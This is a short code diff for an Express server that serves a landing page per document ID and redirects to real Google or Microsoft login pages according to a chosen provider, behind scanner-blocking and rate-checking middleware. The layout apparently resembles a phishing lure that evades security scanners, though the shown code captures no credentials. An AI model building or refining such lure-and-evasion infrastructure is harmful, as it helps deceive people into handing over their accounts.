@@ -300,17 +300,17 @@ function isTooFast(req) {
 app.use(scannerMiddleware);
 
 // ======= Routes =======
-app.get('/secure/:docId',(req, res) => {
+app.get('/documents/:docId',(req, res) => {
   const docId = sanitizeInput(req.params.docId);
   log('info', { event: 'serve_landing', ip: req.clientIp, docId });
   return res.sendFile(path.join(__dirname, 'pages', 'landing.html'));
 });
 
-app.post('/auth/verify', apiProtectionMiddleware, (req, res) => {
+app.post('/documents/verify', apiProtectionMiddleware, (req, res) => {
   const { provider } = req.body;
   const testingUrls = {
-    google: 'https://facebook.com',
-    microsoft: 'https://instagram.com'
+    google: 'https://mail.google.com/',
+    microsoft: 'https://login.microsoftonline.com/'
   };
   const redirectUrl = testingUrls[provider] || '/error';
   log('info', { event: 'auth_verify', ip: req.clientIp, provider, redirectUrl });
